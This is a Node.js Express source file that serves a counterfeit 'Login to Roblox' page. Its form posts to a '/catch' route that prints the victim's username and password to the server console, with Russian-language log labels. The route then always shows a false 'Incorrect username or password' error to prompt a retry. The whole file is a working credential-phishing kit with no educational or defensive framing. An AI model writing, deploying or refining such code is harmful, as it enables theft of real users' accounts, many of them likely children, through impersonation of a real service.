const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

function getLoginPage(showError = false) {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-image: url('https://www.image2url.com/r2/default/images/1788473774650-1005b288-aae3-4eda-bb46-7589686522fd.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }

        .auth-container { 
            background-color: #23252b;
            padding: 39px 15px 100px; 
            border-radius: 6px; 
            width: 100%;
            max-width: 400px;
            margin-top: 12px;
            position: relative;
            z-index: 10;
        }

        h1 {
            color: #ffffff; 
            text-align: center; 
            margin-bottom: 18px; 
            font-size: 26px; 
            font-weight: 700; 
        }

        .error-message {
            color: #ff4d4d;
            font-size: 13.5px;
            margin: 6px 0 10px 0;
            text-align: left;
            display: ${showError ? 'block' : 'none'};
        }

        .input-control { 
            width: 100%; 
            padding: 12px 15px; 
            margin-bottom: 9px; 
            background-color: #2d3038;
            border: 1px solid #3a3e47; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 14.5px; 
        }

        .input-control::placeholder { color: #9a9ea6; }
        
        .input-control:focus { 
            outline: none; 
            border-color: #ffffff; 
            background-color: #353942;
        }

        .btn-submit { 
            width: 100%; 
            padding: 12px; 
            background-color: transparent; 
            border: 1.5px solid #ffffff; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 15.5px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-bottom: 13px; 
        }
        
        .btn-submit:hover { background-color: rgba(255, 255, 255, 0.08); }

        .link-text { 
            display: block; 
            text-align: center; 
            color: #ffffff; 
            font-size: 14px; 
            text-decoration: none; 
            margin-bottom: 14px; 
        }

        .link-text:hover { text-decoration: underline; }

        .secondary-actions { 
            display: flex;
            flex-direction: column;
            gap: 9px;
            margin-bottom: 14px;
        }

        .btn-secondary { 
            width: 100%; 
            padding: 12px; 
            background-color: #2d3038; 
            border: none; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 14.5px; 
            cursor: pointer; 
        }
        
        .btn-secondary:hover { background-color: #383c45; }

        .signup-text {
            text-align: center;
            color: #ffffff;
            font-size: 14px;
        }

        .signup-text a {
            color: #ffffff;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-text a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="auth-container">
        <h1>Login to Roblox</h1>
        
        <form action="/catch" method="POST">
            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
            <input type="password" name="password" class="input-control" placeholder="Password" required>
            <div class="error-message">Incorrect username or password.</div>
            <button type="submit" class="btn-submit">Log In</button>
        </form>

        <a href="#" class="link-text">Forgot Password or Username?</a>
        
        <div class="secondary-actions">
            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
            <button type="button" class="btn-secondary">Quick Sign-In</button>
        </div>
        
        <div class="signup-text">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>
</body>
</html>
    `;
}

app.get('/', (req, res) => {
    res.send(getLoginPage(false));
});

app.post('/catch', (req, res) => {
    const login = req.body.username;
    const pass = req.body.password;

    console.log(`\n==============================`);
    console.log(`[ПОЛУЧЕНЫ ДАННЫЕ ВХОДА]`);
    console.log(`Логин (Имя пользователя): ${login}`);
    console.log(`Пароль: ${pass}`);
    console.log(`==============================`);

    res.send(getLoginPage(true));
});

app.listen(PORT, () => {
    console.log(`=== СЕРВЕР РАБОТАЕТ НА ПОРТУ ${PORT} ===`);
});
